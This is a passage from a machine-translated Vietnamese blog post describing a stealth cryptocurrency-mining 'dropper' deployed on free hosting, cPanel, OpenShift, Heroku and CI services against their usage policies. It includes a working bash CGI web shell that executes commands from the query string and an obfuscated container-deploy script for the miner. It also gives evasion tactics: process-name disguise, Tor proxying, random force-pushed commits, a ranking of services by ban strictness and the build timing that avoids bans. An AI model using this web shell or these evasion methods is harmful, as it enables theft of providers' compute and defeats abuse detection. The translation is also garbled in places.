lập lại tất cả các cấu hình một cách nhanh chóng, điều này khá tuyệt, là tấm bạt lò xo cuối cùng.<h2 id=debugging><a class=header-anchor href=#debugging> Gỡ lỗi</a></h2><p>Có ba tiện ích chính<ul><li><p>bật / tắt theo dõi xung quanh các khối mã (chúng tôi không muốn theo dõi một nhị phân được mã hóa b64 trong một biến ..)<li><p>một chức năng đơn giản để định dạng nhật ký<li><p>một cờ sẽ kích hoạt ghi nhật ký chi tiết trong thời gian chạy bất cứ khi nào công cụ khai thác được khởi động.<ul><li><p>hiện tập tin<code>.debug</code> hiện hữu?<ul><li><p>cho phép ghi nhật ký chi tiết</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Triển khai mục tiêu</a></h2><p>Thiết lập này đã được thử nghiệm trên 3 loại máy chủ:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Vùng chứa hoặc máy ảo tự lưu trữ</a></h3><p>Nhiều nhà cung cấp dịch vụ lưu trữ không thích khai thác vì tài nguyên CPU có xu hướng được chia sẻ giữa nhiều người dùng và phần mềm khai thác có thể dễ dàng làm chậm một nút máy chủ, ảnh hưởng đến hiệu suất cho những người dùng còn lại. Điều này có thể đúng ngay cả khi thời gian của người dùng CPU là không giới hạn, vì các thuật toán băm có thể bão hòa tất cả các lớp bộ nhớ đệm của CPU nếu bộ nhớ cache được chia sẻ giữa tất cả các lõi CPU.<p>Chúng tôi muốn sử dụng<em> công bằng</em> chia sẻ tài nguyên mà không bị cấm, đó là một trường hợp sử dụng tốt cho ống nhỏ giọt tàng hình của chúng tôi vì nó nhận thức được việc sử dụng máy chủ, có nghĩa là nó<em> Nên</em> ở trong [AUP]. Không có bước bổ sung nào khi xử lý các triển khai tự lưu trữ, chỉ là tập lệnh trình khởi chạy, có thể được thêm vào trình tự khởi động hoặc khởi chạy theo cách thủ công.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> lưu trữ web dựa trên cPanel</a></h3><p>Các gói đăng ký lưu trữ web chủ yếu được cung cấp thông qua [cPanel]. Một lần nữa ở đây chúng tôi đang sử dụng các gói đăng ký cá nhân có giới hạn tài nguyên hợp lý, mặt khác, bất kỳ gói miễn phí nào cũng có giới hạn vô lý<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel cho phép bạn xác định trình xử lý cho các phần mở rộng tệp khác nhau, điều này cho phép chúng tôi thực thi các tập lệnh shell thông qua<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> với một yêu cầu http đối với một tập lệnh shell được tải lên trên máy chủ. Những loại giao diện này giống như web-shell<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Một trình bao web bash đơn giản<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Tốt hơn là chỉ dựa vào nội trang vì việc tạo thêm các quy trình có thể không được phép trong web jail, nhưng luôn có thể<code>exec</code> cho phép chúng tôi sử dụng hầu hết các tiện ích dòng lệnh. Hầu hết các trình bao web được viết bằng các ngôn ngữ kịch bản khác như python hoặc php vì bạn không phải lo lắng về việc phân tách.<p>Trong môi trường cpanel, tốt hơn nên sử dụng tên tĩnh cho quy trình khai thác, như<code>httpd</code> hoặc<code>php-fpm</code> tại vì<code>cgi</code> dựa trên nhiều quá trình xử lý, vì vậy các máy chủ luôn chứa đầy nhiều quá trình có tên như thế này, mặc dù một người quan sát cẩn thận sẽ nhận thấy<em> đa luồng</em> kiểu sử dụng chắc chắn không phổ biến (hoặc có thể xảy ra) đối với các ngôn ngữ như perl, php, ruby ​​hoặc python!<p>Các quy trình cũng có giới hạn thời gian theo mặc định, (1 giờ, 1 ngày, v.v.), đối với điều này, chúng tôi chỉ sử dụng một công việc cron khởi động lại ống nhỏ giọt.<p>Điều này đòi hỏi nhiều chỉnh sửa thủ công, api cpanel để tự động hóa điều này rất tiếc không được hiển thị cho người dùng cuối, vì vậy lưu trữ web là một mục tiêu khó hiểu và nhàm chán cho công cụ khai thác nhỏ giọt của chúng tôi.<h3 id=web_environments><a class=header-anchor href=#web_environments> Môi trường web</a></h3><p>Có<em> SaaS</em> các nhà cung cấp có trình chỉnh sửa web kết hợp với vùng chứa, chẳng hạn như<a href="with a free tier before getting acquired by amazon"> đám mây9</a> , [codeanywhere], [codenvy]. Việc triển khai ống nhỏ giọt ở đây rất dễ dàng (bạn có một môi trường đầy đủ), nhưng giữ cho nó hoạt động là một gánh nặng, vì bất kỳ trình chỉnh sửa web tương tác nào cũng kết thúc phiên của nó ngay sau khi trang web bị đóng và do đó vùng chứa được chuyển sang trạng thái ngủ (trừ khi bạn tất nhiên).<p>Việc loại bỏ điều này chỉ có thể có nghĩa là chúng tôi phải giữ cho các phiên mở, một số tập lệnh với [puppeteer] đã đạt được kết quả mong muốn, nhưng chạy lâu, rò rỉ bộ nhớ, các trang web SPA bị phình ra chắc chắn không hấp dẫn và không phải là lén lút, bởi vì từ chương trình phụ trợ của nhà cung cấp, một phiên mở 24/7 chắc chắn sẽ trông đáng ngờ. Thật vậy, môi trường web cũng là những mục tiêu khó hiểu và nhàm chán.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Các dịch vụ ứng dụng miễn phí</a></h3><p>Điều này chủ yếu là<a href="when it used to have a free tier"> mở cửa</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> và [heroku]. Openshift, do kubernetes triển khai hơi đơn giản, nhưng có đầy đủ các lỗi cấu hình, đây là một đoạn trích:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Đây là tập lệnh được sử dụng để xây dựng vùng chứa khai thác yêu cầu mẫu yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Nhưng toàn bộ quá trình bao gồm khá nhiều bước!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>Trong mã giả:<ul><li><p>tạo dự án<li><p>tạo ứng dụng mà không có hình ảnh<li><p>xây dựng thùng khai thác<li><p>triển khai vùng chứa với cấu hình triển khai (trừu tượng kubernetes)<li><p>triển khai việc triển khai</ul><p>Các<code>build-build</code> thay vào đó, các tập lệnh đã tạo ra một<em> xây dựng</em> thùng chứa sẽ khai thác trong vài giờ cùng một lúc. Công trình xây dựng và nhóm bình thường có các tài nguyên riêng biệt trong openhift, vì vậy chúng tôi đã khai thác cả hai. Openshift nhìn chung là một trải nghiệm tồi tệ vì nó đã trải qua 4 bản phát hành khác nhau (có thể nhiều hơn, tôi đã ngừng theo dõi sau một thời gian) và mỗi người trong số họ yêu cầu thay đổi cấu hình, chúng không có đường dẫn nâng cấp và mọi thứ đều nhanh chóng được lặp lại và điều đó là phổ biến đối với các bản dựng / nhóm bị đình trệ và không được thu gom rác ... họ thường chạy thủ công khởi động lại thỉnh thoảng, có lẽ kubernetes chỉ là lỗi :)<p>Cấu hình Heroku đơn giản hơn một chút (không liên quan đến kubernetes). Ngoài bản dựng vùng chứa, tương tự như bản mở rộng, phần còn lại chỉ là hai lệnh cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Vùng chứa được đẩy trực tiếp bằng docker đến sổ đăng ký heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Điều mâu thuẫn với heroku (hạng miễn phí vẫn còn tồn tại cho đến thời điểm viết bài) là dynos chỉ có thể chạy trong 22 ngày mỗi tháng, vì vậy họ yêu cầu một số quản lý thủ công mỗi tháng, một lần nữa rắc rối và nhàm chán. Họ đã thực hiện một số làn sóng cấm ngay từ đầu, và sau đó họ vô hiệu hóa đăng ký thông qua TOR, tôi khá chắc chắn mình là nguyên nhân của điều này.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Bộ chứa CI hoặc máy ảo</a></h3><p>Đây là những mục tiêu hiệp đồng nhất cho ống nhỏ giọt của chúng tôi. Có nhiều<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> các công ty, trong đó có nhiều công ty đang đốt tiền của các nhà đầu tư khi cung cấp các bậc miễn phí với hy vọng thu về một số thị phần trong lĩnh vực kinh doanh cơ sở hạ tầng công nghệ.<p>Tất cả các dịch vụ này cung cấp các tài nguyên khác nhau, có các yêu cầu cấu hình khác nhau và chạy trong các môi trường khác nhau. Tôi chưa bao giờ nghĩ đến việc tự động đăng ký tài khoản vì những thứ đó rất khó lập trình, tôi cố gắng tránh chúng mọi lúc, vì vậy tôi chỉ chịu đựng đăng ký thủ công một thời gian vì tôi tò mò muốn biết loại phản hồi chống spam nào tôi sẽ nhận được (và khác biệt như thế nào so với phần còn lại!). Bạn có thể đoán một số điều về quản lý của một công ty từ cách nó xử lý thư rác:<ul><li><p>Nó có thực hiện các làn sóng cấm không? Sau đó, họ có các chính sách không nghiêm ngặt, các vấn đề được xử lý theo cách thủ công và theo từng trường hợp<li><p>Nó có yêu cầu xác minh điện thoại không? Chúng đã bị lạm dụng trong quá khứ<li><p>Họ có phản ứng với việc sử dụng nhiều tài nguyên không? Họ đang chạy với một ngân sách eo hẹp<li><p>Họ có áp dụng các hạn chế tài khoản hoặc lệnh cấm ẩn? Nếu họ cấm đoán, họ có nghĩa là sysadmins.</ul><p>Ngoài ra còn có một câu hỏi triết học: Nếu một dịch vụ cho phép bạn lạm dụng hệ thống của họ trong một thời gian dài, điều đó có nghĩa là họ có cơ sở hạ tầng hàng đầu có khả năng xử lý tải, hay chỉ đơn giản là kiểm soát hệ thống của họ kém? Và bạn phải cân nhắc sự cân bằng giữa khả năng truy cập và bảo mật, một hệ thống quá an toàn có thể làm giảm tỷ lệ giữ chân người dùng.<p>Đây là bảng hiển thị một số dịch vụ mà tôi đã triển khai:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>cấu hình<th style=text-align:center>màn biểu diễn<th style=text-align:center>cấm búa<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>tồi tệ<td style=color:#ff0;text-align:center>Trung bình<td style=color:#ff0;text-align:center>Trung bình<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>tốt<td style=color:#ff0;text-align:center>Trung bình<td style=color:green;text-align:center>tốt<tr><td style=text-align:center>Codeship<td style=color:#ff0;text-align:center>Trung bình<td style=color:red;text-align:center>tồi tệ<td style=color:#ff0;text-align:center>Trung bình<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>Trung bình<td style=color:green;text-align:center>tốt<td style=color:green;text-align:center>tốt<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>tồi tệ<td style=color:green;text-align:center>tốt<td style=color:#ff0;text-align:center>Trung bình<tr><td style=text-align:center>Semaphore<td style=color:green;text-align:center>tốt<td style=color:green;text-align:center>tốt<td style=color:#ff0;text-align:center>Trung bình<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>Trung bình<td style=color:#ff0;text-align:center>Trung bình<td style=color:green;text-align:center>tốt<tr><td style=text-align:center>Quay<td style=color:green;text-align:center>tốt<td style=color:#ff0;text-align:center>Trung bình<td style=color:#ff0;text-align:center>Trung bình<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>tồi tệ<td style=color:green;text-align:center>tốt<td style=color:#ff0;text-align:center>Trung bình<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>Trung bình<td style=color:#ff0;text-align:center>Trung bình<td style=color:red;text-align:center>tồi tệ<tr><td style=text-align:center>Azure-đường ống<td style=color:#ff0;text-align:center>Trung bình<td style=color:#ff0;text-align:center>Trung bình<td style=color:red;text-align:center>tồi tệ<tr><td style=text-align:center>Liên tục<td style=color:red;text-align:center>tồi tệ<td style=color:#ff0;text-align:center>Trung bình<td style=color:#ff0;text-align:center>Trung bình<tr><td style=text-align:center>Bạn bè<td style=color:red;text-align:center>tồi tệ<td style=color:red;text-align:center>tồi tệ<td style=color:red;text-align:center>tồi tệ<tr><td style=text-align:center>Máy bay không người lái<td style=color:red;text-align:center>tồi tệ<td style=color:green;text-align:center>tốt<td style=color:red;text-align:center>tồi tệ<tr><td style=text-align:center>Băng tải<td style=color:red;text-align:center>tồi tệ<td style=color:#ff0;text-align:center>Trung bình<td style=color:red;text-align:center>tồi tệ<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>tồi tệ<td style=color:green;text-align:center>tốt<td style=color:#ff0;text-align:center>Trung bình<tr><td style=text-align:center>Zeist / vercel<td style=color:red;text-align:center>tồi tệ<td style=color:green;text-align:center>tốt<td style=color:red;text-align:center>tồi tệ</table><p>Trong bối cảnh này, một<span style=color:green> tốt</span> cấu hình có nghĩa là không mất nhiều thời gian để định cấu hình<code>ci</code> công việc cho quá trình khai thác (giống như tất cả các dịch vụ dựa vào bảng điều khiển web thay vì tệp dot-kho lưu trữ là một công việc vặt),<span style=color:red> tồi tệ</span><code>ban-hammer</code> có nghĩa là rất khó để đăng ký dịch vụ, hoặc các tài khoản sẽ bị cấm mạnh hơn.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> yêu cầu thiết lập một dự án, để suy ra môi trường, kiến ​​trúc mục tiêu, quá trình thực thi và những thứ khác, rất mất thời gian để thiết lập một bản dựng nên nó bị đánh giá xấu trong cấu hình.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Liên tục</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Bạn bè</a> , [Codefresh] cũng có nhiều bước cấu hình thủ công không khai báo.<p>Các dịch vụ như [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Bạn bè</a> áp dụng các lệnh cấm ẩn trên các tài khoản, các lệnh cấm ẩn là không tốt, vì chúng khiến bạn đoán xem có điều gì sai với cấu hình của bạn hay không. Với một số dịch vụ, bạn có thể đoán được lý do của lệnh cấm (phần lớn quá trình xây dựng của bạn mất quá nhiều thời gian hoặc bạn đã xây dựng quá nhiều lần trong một khoảng thời gian ngắn), đối với một số dịch vụ khác như [Azure-pipelines], tôi cho rằng họ đã áp dụng một số loại dấu vân tay đối với kho lưu trữ của người dùng khi các lệnh cấm được thực hiện ngay cả khi không có bất kỳ sự lạm dụng nào về tài nguyên, azure và vercel cũng bị hạn chế<code>DNS</code> truy cập bên trong các máy xây dựng công cộng, do đó, đó là ma sát bổ sung cần được khắc phục với đường hầm đặc biệt.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Máy bay không người lái</a> đã cấp quyền truy cập vào toàn bộ bộ xử lý 16 lõi trở lên nhưng cuối cùng lại bị cấm sau 2 lần xây dựng<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Codeship</a> cũng cấp quyền truy cập vào các máy chủ xây dựng mạnh mẽ và không cấm mạnh mẽ như máy bay không người lái.<p>Các dịch vụ yêu thích của tôi không phải vì lợi nhuận mà vì sự dễ dàng và thuận tiện (cũng như với các dự án khác) là<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semaphore</a> và<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-trung tâm</a> . Travis giống như CI tiêu chuẩn và rất linh hoạt, Semaphore là<code>DSL</code> vì<code>CI</code> trông có vẻ dễ tiếp cận và tốt mặc dù vậy thay vì chỉ là một chuỗi vô tận các hộp kiểm được phân loại như các giao diện người dùng khác và Docker chỉ nhằm mục đích đơn giản là ánh xạ các tệp dockerfiles với các bản dựng.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Xây dựng cấu hình</a></h3><p>Các bản dựng được kích hoạt bởi các công việc cron được cung cấp bởi các dịch vụ web hoặc bởi các cam kết git. Vì vậy, bạn phải theo dõi một đống mã thông báo truy cập hoặc khóa ssh để quản lý tất cả các cam kết git. Điều quan trọng nữa là không gửi quá nhiều cam kết spam và sử dụng proxy khi đẩy đến kho lưu trữ định cấu hình git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Sử dụng dịch vụ lưu trữ git, github là người hiểu rõ hơn về các lệnh cấm, nhưng chúng chỉ được thực thi khi quản trị viên dịch vụ ci báo cáo lạm dụng, gitlab đã thực hiện lệnh cấm một lần, khi tôi cố gắng gia hạn bản dùng thử CI (bất cẩn). Tôi chưa bao giờ nhận được lệnh cấm đối với tài khoản bitbucket. Để (buộc) push git commit, chúng ta có một vòng lặp chạy dài gắn thẻ lại kho lưu trữ git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Có thể lực đẩy theo cách này không phải là thứ mà github thích lắm và có thể là nguyên nhân khiến tài khoản bị gắn cờ. Chức năng gắn thẻ có nhiệm vụ buộc đẩy các cam kết khác nhau, sử dụng một trang web (mà bạn có thể tra cứu khá dễ dàng) đưa ra một số cam kết ngẫu nhiên. Tôi không chắc điều này sẽ giúp ích bao nhiêu, vì bản thân nội dung của các cam kết rõ ràng là đáng ngờ đối với trường hợp của tôi. Và nó cũng đã cắn tôi một lần, vì các cam kết được trả lại bởi lệnh này có thể bao gồm các từ chửi thề, một trong các cam kết của tôi đã được một bot twitter theo dõi các cam kết git với các từ chửi thề! Tôi đã thêm vào danh sách đen những lời lẽ không hay sau vụ việc.<p>Tôi chưa thực sự đi sâu vào các cam kết git bị xáo trộn và các kho lưu trữ git bị xáo trộn. Trường hợp duy nhất mà tôi đang sử dụng kho lưu trữ phức tạp hơn là với Bitrise vì bạn không thể thiết lập bản dựng nếu hệ thống không nhận ra môi trường (như ứng dụng dành cho thiết bị di động), nhưng ngay cả sau đó không có bất kỳ vòng quay nào và nó luôn giống nhau kho lưu trữ, khá dễ phát hiện.<p>Nhìn chung, nếu tôi phải vẽ một đường cong chuông vào khoảng thời gian tối ưu để khai thác<em> không có</em>khiến tài khoản bị cấm, trên tất cả các dịch vụ đã thử nghiệm, sẽ có thời lượng xây dựng trung tâm khoảng 1 giờ, một lần mỗi ngày. Đối với lõi cpu, ngoại trừ một số người nói dối (như máy bay không người lái), hầu hết các dịch vụ đều mong đợi bạn sử dụng toàn bộ lượng tài nguyên được cung cấp cho bạn vì các bản dựng được chạy bên trong máy ảo hoặc vùng chứa với tài nguyên bị hạn chế ... và biên dịch thường là một nhiệm vụ bão hòa cpu, vì vậy nó không có liên quan thống kê. Trực quan một lần xây dựng mỗi ngày là điều mà các nhà phát triển trung bình sẽ làm, vì vậy bạn nên mong đợi những lá cờ được nâng lên nếu bạn đi lạc xa ý nghĩa và việc thúc đẩy lạm dụng không bao giờ kết thúc tốt đẹp.<h2 id=conclusions><a class=header-anchor href=#conclusions> Kết luận</a></h2><p>Nó có đáng không? Các phần mạng chắc chắn rất thú vị, giải quyết việc đăng ký tài khoản rõ ràng là phần tồi tệ nhất, không ai thích nhấp vào email xác nhận vô tận và lặp đi lặp lại các quy trình UI tê liệt. Viết phần mềm tự động hóa thư rác cũng rất nhàm chán (vì bạn hầu như chỉ chăm chăm vào các API ngu ngốc), và với giả định này (và thực tế là điều này chưa bao giờ là điều gì nghiêm trọng), tôi thậm chí chưa bao giờ xem xét nó. Nó có lợi nhuận không? Ở đỉnh điểm, nó đã đạt đến một cái gì đó giống như<code>300$</code> mỗi tháng, có lẽ đủ cho một venezuelan, không thực sự cho tôi :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> sysadmin gắt gỏng</em></table><table class=fndef 